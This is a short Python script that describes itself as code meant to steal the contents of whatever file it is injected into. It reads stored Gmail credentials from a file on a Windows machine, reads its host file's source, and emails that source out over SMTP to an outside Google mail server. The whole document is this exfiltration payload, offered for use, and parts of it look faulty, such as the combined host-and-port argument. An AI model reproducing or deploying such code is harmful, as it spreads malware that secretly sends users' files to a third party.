"""
A simple python script to steal what it has been injected
into and email it to a given gmail address.
"""
import smtplib, ssl, os, inspect
DATA_TO_INSERT = "GOTCHA!"

port = 465
pat = "C:\\Users\\Public\\Documents\\virus_box_info.txt"
f = open(pat)
info = f.readlines()
f.close()
account = info[0]
password = info[1]

target = inspect.currentframe().f_code.co_filename
path = os.path.abspath("")
f = open(os.path.abspath(path + "/" + target))
message = f.read() + "\r\n"
f.close()
context = ssl.create_default_context()

with smtplib.SMTP_SSL("64.233.184.108:465") as server:
    server.login(account, password)
    server.sendmail(account, account, message)